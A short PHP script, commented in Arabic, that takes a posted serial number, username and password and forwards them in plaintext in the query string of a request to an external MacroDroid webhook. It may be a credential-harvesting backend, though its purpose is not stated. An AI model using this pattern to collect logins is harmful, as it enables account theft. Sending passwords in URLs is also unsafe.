<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // استقبال البيانات المرسلة عبر POST
    $sn = $_POST['sn'];
    $username = $_POST['username'];
    $password = $_POST['password'];

    // رابط الـ Webhook مع المتغيرات
    $webhook_url = "https://trigger.macrodroid.com/9519b967-983a-4878-a3c7-7d9560ffa0f7/pro?user=" . urlencode($username) . "&password=" . urlencode($password) . "&serial=" . urlencode($sn);

    // فتح الرابط وإرسال الطلب
    $response = file_get_contents($webhook_url);

    if ($response === FALSE) {
        // في حالة حدوث خطأ أثناء فتح الرابط
        echo "حدث خطأ أثناء إرسال البيانات إلى Webhook.";
    } else {
        // إذا تم إرسال البيانات بنجاح
        echo "تم إرسال البيانات بنجاح إلى Webhook. الرد: " . $response;
    }
}
?>
